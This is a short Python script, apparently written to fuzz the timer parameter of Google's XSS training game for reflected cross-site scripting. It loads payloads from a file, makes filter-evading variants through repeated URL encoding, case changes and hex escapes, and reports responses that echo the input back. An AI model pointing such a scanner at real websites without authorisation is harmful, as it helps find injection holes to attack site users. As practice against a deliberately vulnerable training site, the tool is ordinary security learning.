import requests
import urllib.parse
import random

url = "https://xss-game.appspot.com/level4/frame?timer="

username = ""
password = ""

def inject(injection, original):
	r = requests.get(url + injection, auth=(username, password))
	result = ""
	if r.status_code is 200:
		result = "ok\t"
		if original.lower() in r.text.lower():
			result = str("maybe\t")
	else:
		result += "connection error"
	result += str(injection)
	print(result)

def charToHex(c):
	return "\\x" + format(ord(c), "x")

def encode_hex(injection):
	result = ""
	for c in injection:
		result += charToHex(c)
	return result

def randomUpperLower(c):
	if random.randint(0,2) == 1:
		return c.lower()
	else:
		return c.upper()

def randomizeUpperLower(injection):
	result = ""
	for c in injection:
		result += randomUpperLower(c)
	return result

def allUpper(injection):
	return injection.upper()

def encode_url(input):
	return urllib.parse.quote(input, safe='')

def generate_transformations(injection):
	injection_transformations = [injection,
                encode_url(injection),
                encode_url(encode_url(injection)),
		encode_url(encode_url(encode_url(injection))),
		randomizeUpperLower(injection),
		allUpper(injection),
		encode_hex(injection)]
	return injection_transformations

def scan():
	file = open("xss.txt","r")
	for injection in file:
		if injection != "":
			injection_transformations = generate_transformations(injection[:-1])
			for xss in injection_transformations:
				inject(xss, injection_transformations[0])

scan()
